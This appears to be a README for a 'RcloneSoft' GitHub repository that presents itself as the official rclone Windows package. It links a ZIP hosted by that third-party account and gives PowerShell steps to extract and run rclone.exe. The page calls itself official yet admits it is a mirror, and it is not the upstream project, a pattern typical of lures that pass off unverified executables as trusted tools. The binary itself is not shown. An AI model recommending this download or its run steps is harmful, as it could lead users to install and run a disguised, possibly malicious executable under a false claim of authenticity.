# rclone — File Synchronization & Backup

Official rclone Windows package reference for file synchronization, cloud storage transfers, and backup workflows.

## Download

[Download rclone v1.75.2 for Windows x64](https://github.com/RcloneSoft/rclone-download/releases/latest/download/rclone-v1.75.2-windows-amd64.zip)

The ZIP contains `rclone.exe` and the accompanying documentation. It is a portable Windows build: extract it and run `rclone.exe` from PowerShell or Command Prompt.

## What rclone does

- Synchronizes files and directories between local storage and cloud providers
- Creates backup copies with transfers, checks, and resumable operations
- Supports many cloud and storage backends through one command-line tool
- Provides filtering, encryption, checksums, retries, and scheduled automation

## Quick start

```powershell
Expand-Archive .\rclone-v1.75.2-windows-amd64.zip -DestinationPath .
cd .\rclone-v1.75.2-windows-amd64
.\rclone.exe version
.\rclone.exe config
```

Create a copy after configuring a remote:

```powershell
.\rclone.exe copy "C:\Users\Public\Documents" "remote:backups/documents" --progress
```

## License and attribution

rclone is an open-source project. This repository provides a package reference and GitHub-hosted delivery mirror for the RcloneSoft profile. See the upstream project for license and source details.
